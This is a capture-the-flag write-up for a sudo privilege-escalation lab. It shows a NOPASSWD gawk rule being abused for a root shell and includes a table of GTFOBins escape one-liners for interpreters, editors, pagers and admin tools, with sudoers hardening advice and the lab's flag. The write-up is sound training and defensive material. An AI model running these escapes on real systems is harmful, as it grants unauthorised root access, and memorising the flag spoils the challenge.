# L02 · Act I · Privilege Escalation — Permitted, With Conditions
 
**MITRE tag:** T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching  
**Challenge type:** Sudo policy abuse / GTFOBins NOPASSWD command  
**Flag:** `bl_c7c778325be622ad3344a7394e052d43`  
**SSH:** `pe-sudo@204.168.229.209 -p 2224`
 
---
 
## Challenge brief
 
> *"The sudo policy lets you run something. Policies are written by people, and people leave gaps: a wildcard, a kept variable, one command that quietly does more than it looks."*
 
The box has a sudo rule that lets you run a specific command as root without a password. The command looks harmless — it's a text processing tool — but it has a hidden capability that lets you break out to a shell. Find the rule, identify the escape, get root, read the key.
 
---
 
## The correct approach
 
**Step 1 — Check your sudo rules.**
 
```bash
sudo -l
```
 
This lists every command you are allowed to run via sudo, and the conditions. Read every line. You are looking for any command with `NOPASSWD` — that means you can run it as root with no password prompt, no friction.
 
**Step 2 — For every allowed binary, check GTFOBins.**
 
Go to `https://gtfobins.github.io/`, search for the binary name, and look at the **Sudo** tab. GTFOBins documents every known way to escape from a binary that is running with elevated privileges. If a binary is listed there with a Sudo entry, it can be turned into a root shell.
 
This step applies to every binary in your sudo rules, no matter how innocent it looks. `gawk` is a text processor — it reads files and applies pattern/action rules to them. It does not look like a privilege escalation tool. But it has a `system()` function that executes arbitrary shell commands, so it is one.
 
**Step 3 — Run the escape.**
 
```bash
sudo gawk 'BEGIN {system("/bin/sh")}'
```
 
**Step 4 — Locate the key and submit.**
 
```bash
find /root -type f 2>/dev/null
cat /root/.pe-sudo-key > /tmp/.pe-sudo-proof
verify
```
 
Total commands: 5. This level was fast because the L01 lesson stuck — check what you have before guessing.
 
---
 
## How sudo works and what went wrong here
 
### What `sudo -l` tells you
 
`sudo -l` reads `/etc/sudoers` (and any files in `/etc/sudoers.d/`) and prints only the rules that apply to your user. A typical line looks like:
 
```
(root) NOPASSWD: /usr/bin/gawk
```
 
| Part | Meaning |
|---|---|
| `(root)` | Run the command as this user |
| `NOPASSWD:` | No password prompt required |
| `/usr/bin/gawk` | Only this exact binary path is allowed |
 
`NOPASSWD` exists for legitimate reasons — automated scripts and cron jobs that need to run a root command without a human present. The mistake is putting it on the wrong binary.
 
---
 
### What makes a binary dangerous in sudo
 
Not every binary is equal. Some do exactly one thing — `systemctl restart nginx` restarts a service, period. But many binaries have general-purpose features that, combined with root privileges, become an escalation path.
 
**Interpreters and scripting languages**
 
These are general-purpose code execution engines. Giving any of them sudo is effectively giving `sudo /bin/sh` with extra steps.
 
| Binary | Escape |
|---|---|
| `python`, `python3` | `sudo python3 -c 'import os; os.system("/bin/sh")'` |
| `perl` | `sudo perl -e 'exec "/bin/sh"'` |
| `ruby` | `sudo ruby -e 'exec "/bin/sh"'` |
| `node` | `sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'` |
| `awk`, `gawk` | `sudo gawk 'BEGIN {system("/bin/sh")}'` |
| `php` | `sudo php -r 'system("/bin/sh");'` |
| `lua` | `sudo lua -e 'os.execute("/bin/sh")'` |
 
**Editors**
 
Editors have shell escape commands built in. Once the editor is running as root, any of these land you in a root shell.
 
| Binary | Escape |
|---|---|
| `vim`, `vi` | Open any file, then type `:!/bin/bash` |
| `nano` | Open any file, then `Ctrl-R Ctrl-X` and type `reset; bash 1>&0 2>&0` |
| `emacs` | `sudo emacs -Q -nw --eval '(term "/bin/sh")'` |
 
**Pagers**
 
| Binary | Escape |
|---|---|
| `less` | Open any file, then type `!/bin/bash` |
| `more` | Open a file long enough to paginate, then type `!/bin/bash` |
 
**Admin tools with hook systems**
 
These look safe because they are not shells or editors, but they have plugin or hook mechanisms that run arbitrary commands as part of their normal operation.
 
| Binary | Escape |
|---|---|
| `apt-get` | `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash` |
| `git` | `sudo git -p help` then type `!/bin/bash` inside the pager |
| `zip` | `sudo zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/bash"` |
| `tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `make` | `sudo make -s --eval=$'x:\n\t-'"/bin/sh"` |
 
**The rule of thumb:** before adding any binary to a sudo rule, search GTFOBins for it. If it has a Sudo entry, it is dangerous.
 
---
 
### What a correct sudo policy looks like
 
The misconfiguration here was giving `NOPASSWD` access to an entire general-purpose binary. There are two progressively safer approaches.
 
**Option A — Lock down the exact arguments**
 
Instead of allowing the whole binary, specify the exact command including its arguments:
 
```
# Bad — allows anything gawk can do
operator ALL=(root) NOPASSWD: /usr/bin/gawk
 
# Better — locks down the exact script and input file
operator ALL=(root) NOPASSWD: /usr/bin/gawk -f /opt/scripts/report.awk /var/log/app.log
```
 
The user cannot substitute their own arguments because the full command string must match the rule exactly. However this is still somewhat risky with an interpreter — some tools allow other vectors even with fixed arguments.
 
**Option B — Wrap it in a dedicated script (safest)**
 
Write a shell script that does exactly what needs to happen, with all arguments hardcoded:
 
```bash
# /opt/scripts/run-report.sh  (owned root, chmod 755)
#!/bin/sh
exec /usr/bin/gawk -f /opt/scripts/report.awk /var/log/app.log
```
 
Then the sudo rule becomes:
 
```
operator ALL=(root) NOPASSWD: /opt/scripts/run-report.sh
```
 
- The user runs the wrapper script
- The wrapper calls gawk with hardcoded arguments
- No user input ever reaches gawk
- No escape possible
**The core principle:** the narrower the sudo rule, the smaller the attack surface. A rule that allows an entire binary allows everything that binary can do.
 
---
 
### Sudoers best practices checklist
 
| Practice | Why it matters |
|---|---|
| Keep `env_reset` on (it's the default) | Strips the environment before running the command — prevents `LD_PRELOAD` and similar injection |
| Use `NOPASSWD` only for automated/non-interactive tasks | A password prompt slows down an attacker; don't remove it unless you have to |
| Never allow interpreters, editors, or pagers | These are `sudo /bin/sh` in disguise |
| Check GTFOBins before adding any binary | If it has a Sudo entry, don't use it |
| Audit `/etc/sudoers.d/` regularly | Individual rule files get dropped there and forgotten |
| Prefer wrapper scripts over raw binary access | Wrapper hardcodes arguments; no user input reaches the underlying tool |
 
---
 
## Enumeration log
 
### Step 1 — Identify our user
 
```bash
whoami && id
```
 
**Result:** `operator` (uid=1000, gid=1000). Same low-privilege setup as previous levels.
 
---
 
### Step 2 — Check sudo rules
 
```bash
sudo -l
```
 
**Result:**
```
User operator may run the following commands on 46a466a32cd8:
    (root) NOPASSWD: /usr/bin/gawk
```
 
**Conclusion:** One rule. `gawk` is allowed as root with no password. `gawk` is a general-purpose text processing language with a `system()` built-in function. It is on GTFOBins. This is the finding — no further enumeration needed.
 
---
 
### Step 3 — GTFOBins confirms the escape
 
Looking up `gawk` on GTFOBins → Sudo tab:
 
```bash
sudo gawk 'BEGIN {system("/bin/sh")}'
```
 
**How this works:** The `BEGIN` block in AWK runs before any input is processed — unconditionally, with no input file needed. `system("/bin/sh")` is a built-in gawk function that passes its argument to the shell. Since `gawk` is running as root via sudo, the shell it spawns is a root shell.
 
---
 
### Step 4 — Execute the escape
 
```bash
sudo gawk 'BEGIN {system("/bin/sh")}'
```
 
**Result:** Drops into `/ #` prompt.
 
```bash
whoami
```
 
**Result:** `root`
 
---
 
### Step 5 — Find the key
 
```bash
find /root -type f 2>/dev/null
```
 
**Result:**
```
/root/.pe-sudo-key
/root/.ash_history
```
 
```bash
cat /root/.pe-sudo-key
```
 
**Result:** `fbf39360e65a2653e7c24510900ff5cc`
 
---
 
### Step 6 — Submit
 
```bash
cat /root/.pe-sudo-key > /tmp/.pe-sudo-proof
verify
```
 
**Result:**
```
Level solved: pe-sudo
Your flag: bl_c7c778325be622ad3344a7394e052d43
```
 
---
 
## What the vulnerability was
 
The sudoers policy gave `operator` the ability to run `/usr/bin/gawk` as root with no password. AWK programs can call `system()` to execute arbitrary shell commands. Since the sudo rule placed no restrictions on the arguments passed to `gawk`, any user could write a one-line AWK program — `BEGIN {system("/bin/sh")}` — and get a root shell instantly.
 
The challenge title "Permitted, With Conditions" is the point: the policy was meant to permit something specific, but the condition was not narrow enough. It permitted the binary without restricting what the binary could do. GTFOBins documents exactly this class of mistake — every binary listed there is one that someone, somewhere, thought was safe to put in a sudo rule.
 
---
 
## Carryover findings
 
None. Clean box — no unusual SUID binaries, no leftover findings from prior levels.
 
---
 
## Dead ends
 
None this time. `sudo -l` gave the finding immediately, GTFOBins confirmed the escape in one lookup.
 
---
 
## Command reference
 
```bash
# List your sudo rules
sudo -l
 
# gawk sudo escape (GTFOBins)
sudo gawk 'BEGIN {system("/bin/sh")}'
 
# Confirm root
whoami
id
 
# Find files in /root
find /root -type f 2>/dev/null
 
# Write proof and submit
cat /root/.pe-sudo-key > /tmp/.pe-sudo-proof
verify
```